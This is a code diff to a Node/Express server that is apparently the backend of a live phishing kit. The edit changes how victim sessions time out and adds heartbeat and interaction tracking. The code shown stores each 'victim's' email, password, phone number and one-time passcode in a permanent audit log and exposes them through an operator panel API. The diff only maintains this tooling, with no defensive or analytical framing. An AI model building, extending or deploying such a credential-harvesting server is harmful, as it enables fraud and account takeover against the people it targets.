@@ -25,13 +25,15 @@ app.use(session({
 
 /* ----------  STATE  ---------- */
 const sessionsMap     = new Map();   // live sessions
-const sessionActivity = new Map();   // last ping
+const sessionActivity = new Map();   // last ping time
+const sessionLastInteraction = new Map(); // last user interaction time
 const auditLog        = [];          // never deleted
 let victimCounter     = 0;
 let successfulLogins  = 0;
 let currentDomain     = '';          // filled at boot + on every request
 
-const SESSION_TIMEOUT = 3 * 60 * 1000; // 3 min idle fallback
+const HEARTBEAT_TIMEOUT = 30 * 1000;  // 30 seconds - disconnect if no ping
+const IDLE_TIMEOUT      = 60 * 1000;  // 1 minute - idle timeout if no interaction
 
 /* ----------  STATIC ROUTES  ---------- */
 app.use(express.static(__dirname));
@@ -108,17 +110,32 @@ function getSessionHeader(v) {
 function cleanupSession(sid, reason, silent = false) {
   const v = sessionsMap.get(sid);
   if (!v) return;
+  console.log(`[CLEANUP] Victim #${v.victimNum} - ${reason}`);
   sessionsMap.delete(sid);
   sessionActivity.delete(sid);
+  sessionLastInteraction.delete(sid);
 }
 
-/* ----------  TIMEOUT CLEANER (fallback)  ---------- */
+/* ----------  HEARTBEAT & IDLE CHECKER  ---------- */
 setInterval(() => {
   const now = Date.now();
-  for (const [sid, last] of sessionActivity) {
-    if (now - last > SESSION_TIMEOUT) cleanupSession(sid, 'timed out (3min idle)', true);
+  for (const [sid, lastPing] of sessionActivity) {
+    const v = sessionsMap.get(sid);
+    if (!v) continue;
+    
+    // Check heartbeat timeout (disconnected/closed page)
+    if (now - lastPing > HEARTBEAT_TIMEOUT) {
+      cleanupSession(sid, 'disconnected (no heartbeat)', true);
+      continue;
+    }
+    
+    // Check idle timeout (no user interaction for 1 minute)
+    const lastInteraction = sessionLastInteraction.get(sid) || lastPing;
+    if (now - lastInteraction > IDLE_TIMEOUT) {
+      cleanupSession(sid, 'idle timeout (1min no interaction)', true);
+    }
   }
-}, 10000);
+}, 5000); // Check every 5 seconds
 
 /* ----------  API  ---------- */
 
@@ -129,7 +146,7 @@ app.post('/api/session', async (req, res) => {
     const ip  = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
     const ua  = req.headers['user-agent'] || 'n/a';
     const now = new Date();
-    const dateStr = now.toLocaleString(); // ISO or local – panel converts to local tz
+    const dateStr = now.toLocaleString();
 
     victimCounter++;
     const victim = {
@@ -144,6 +161,7 @@ app.post('/api/session', async (req, res) => {
     };
     sessionsMap.set(sid, victim);
     sessionActivity.set(sid, Date.now());
+    sessionLastInteraction.set(sid, Date.now());
     res.json({ sid });
   } catch (err) {
     console.error('Session creation error', err);
@@ -151,7 +169,7 @@ app.post('/api/session', async (req, res) => {
   }
 });
 
-/*  ping  */
+/*  heartbeat ping - keeps session alive  */
 app.post('/api/ping', (req, res) => {
   const { sid } = req.body;
   if (sid && sessionsMap.has(sid)) {
@@ -160,6 +178,13 @@ app.post('/api/ping', (req, res) => {
   }
   res.sendStatus(404);
 });
+
+/*  update interaction timestamp  */
+function updateInteraction(sid) {
+  if (sessionsMap.has(sid)) {
+    sessionLastInteraction.set(sid, Date.now());
+  }
+}
 
 /*  login (client+pin)  */
 app.post('/api/login', async (req, res) => {
@@ -170,7 +195,7 @@ app.post('/api/login', async (req, res) => {
     const v = sessionsMap.get(sid);
     v.entered = true; v.email = email; v.password = password;
     v.status = 'wait'; v.attempt += 1; v.totalAttempts += 1;
-    sessionActivity.set(sid, Date.now());
+    updateInteraction(sid);
     auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, phone: '', ip: v.ip, ua: v.ua });
     res.sendStatus(200);
   } catch (err) {
@@ -188,7 +213,7 @@ app.post('/api/verify', async (req, res) => {
     const v = sessionsMap.get(sid);
     v.phone = phone;
     v.status = 'wait';
-    sessionActivity.set(sid, Date.now());
+    updateInteraction(sid);
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.phone = phone;
     res.sendStatus(200);
@@ -205,7 +230,7 @@ app.post('/api/unregister', async (req, res) => {
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
     const v = sessionsMap.get(sid);
     v.unregisterClicked = true; v.status = 'wait';
-    sessionActivity.set(sid, Date.now());
+    updateInteraction(sid);
     res.sendStatus(200);
   } catch (err) {
     console.error('Unregister error', err);
@@ -221,7 +246,7 @@ app.post('/api/otp', async (req, res) => {
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
     const v = sessionsMap.get(sid);
     v.otp = otp; v.status = 'wait';
-    sessionActivity.set(sid, Date.now());
+    updateInteraction(sid);
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.otp = otp;
     res.sendStatus(200);
@@ -265,12 +290,11 @@ app.post('/api/interaction', (req, res) => {
   if (!sessionsMap.has(sid)) return res.sendStatus(404);
   const v = sessionsMap.get(sid);
   
-  // Store interaction timestamp
   v.lastInteraction = Date.now();
   v.interactions = v.interactions || [];
   v.interactions.push({ type, data, time: Date.now() });
   
-  sessionActivity.set(sid, Date.now());
+  updateInteraction(sid);
   res.sendStatus(200);
 });
 
@@ -285,7 +309,7 @@ app.get('/api/panel', (req, res) => {
     entered: v.entered, unregisterClicked: v.unregisterClicked
   }));
   res.json({
-    domain: currentDomain,               // always fresh
+    domain: currentDomain,
     totalVictims: victimCounter,
     active: list.length,
     waiting: list.filter(x => x.status === 'wait').length,
@@ -328,6 +352,5 @@ app.post('/api/panel', async (req, res) => {
 /* ----------  START  ---------- */
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
-  /* final fallback – overwritten on first request anyway */
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
